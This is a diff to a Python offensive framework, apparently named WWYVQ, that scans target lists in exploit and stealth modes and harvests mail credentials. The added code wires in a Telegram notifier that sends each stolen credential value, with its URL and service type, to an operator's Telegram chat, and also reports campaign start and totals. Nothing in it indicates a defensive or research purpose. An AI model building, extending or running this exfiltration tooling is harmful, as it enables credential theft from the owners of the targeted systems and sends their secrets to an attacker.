@@ -41,6 +41,14 @@ try:
         TELEGRAM_AVAILABLE = False
         print("⚠️ Module Telegram non disponible")
     
+    # Simple Telegram notifier
+    try:
+        from telegram_notifier import TelegramNotifier
+        SIMPLE_TELEGRAM_AVAILABLE = True
+    except ImportError:
+        SIMPLE_TELEGRAM_AVAILABLE = False
+        print("⚠️ Simple Telegram notifier non disponible")
+    
     # Interface web si demandée
     try:
         from app import ExploitationManager
@@ -69,6 +77,7 @@ class WWYVQMasterFramework:
         self.exploit_master = None
         self.mail_hunter = None
         self.telegram_notifier = None
+        self.simple_telegram_notifier = None
         self.web_manager = None
         
         # Configuration unifiée
@@ -145,7 +154,17 @@ class WWYVQMasterFramework:
         else:
             print("⚠️ Telegram désactivé")
         
-        # 5. Interface Web (optionnelle)
+        # 5. Simple Telegram Notifier
+        if SIMPLE_TELEGRAM_AVAILABLE:
+            self.simple_telegram_notifier = TelegramNotifier(
+                bot_token=self.config["telegram_token"],
+                chat_id=self.config["telegram_chat"]
+            )
+            print("✅ Simple Telegram Notifier (telegram_notifier.py)")
+        else:
+            print("⚠️ Simple Telegram notifier non disponible")
+        
+        # 6. Interface Web (optionnelle)
         if self.args.web and WEB_AVAILABLE:
             self.web_manager = ExploitationManager()
             self._start_web_interface()
@@ -228,6 +247,10 @@ ALL SYSTEMS OPERATIONAL! 🚀"""
             
             await self.telegram_notifier.telegram._send_telegram_message(start_msg)
         
+        # Simple Telegram start notification
+        if self.simple_telegram_notifier:
+            await self.simple_telegram_notifier.send_session_start(len(targets))
+        
         # Exécution selon le mode
         print(f"\n🚀 DÉMARRAGE CAMPAGNE - Mode {self.args.mode.upper()}")
         
@@ -295,6 +318,9 @@ ALL SYSTEMS OPERATIONAL! 🚀"""
                 
                 self.global_stats["mail_credentials"] = len(mail_results)
                 print(f"📧 {len(mail_results)} credentials mail trouvés")
+                
+                # Send hit notifications for mail credentials
+                await self._send_hit_notifications(mail_results, "mail")
     
     async def _run_stealth_mode(self, targets):
         """Mode furtif - Scan discret"""
@@ -370,6 +396,44 @@ ALL MODULES EXECUTED SUCCESSFULLY! ✅
         # Telegram final
         if self.telegram_notifier:
             await self.telegram_notifier.telegram._send_telegram_message(summary)
+        
+        # Simple Telegram final notification
+        if self.simple_telegram_notifier:
+            await self.simple_telegram_notifier.send_session_complete({
+                'total_hits': self.global_stats.get('perfect_hits', 0) + self.global_stats.get('mail_credentials', 0),
+                'targets_scanned': self.global_stats.get('targets_loaded', 0),
+                'duration': str(duration)
+            })
+
+    async def _send_hit_notifications(self, hits, hit_type="unknown"):
+        """Send hit notifications via simple telegram notifier"""
+        if not self.simple_telegram_notifier or not hits:
+            return
+        
+        for hit in hits:
+            try:
+                # Extract hit information based on type
+                if hit_type == "mail":
+                    hit_data = {
+                        'url': getattr(hit, 'url', 'Unknown'),
+                        'credential_type': getattr(hit, 'service', 'Mail'),
+                        'credential_value': getattr(hit, 'credential', 'Unknown'),
+                        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+                    }
+                else:
+                    # Generic hit format
+                    hit_data = {
+                        'url': str(hit) if hasattr(hit, '__str__') else 'Unknown',
+                        'credential_type': hit_type,
+                        'credential_value': str(hit) if hasattr(hit, '__str__') else 'Unknown',
+                        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+                    }
+                
+                await self.simple_telegram_notifier.send_hit_notification(hit_data)
+                
+            except Exception as e:
+                print(f"❌ Error sending hit notification: {e}")
+                continue
 
 def parse_master_arguments():
     """Arguments pour le framework master"""
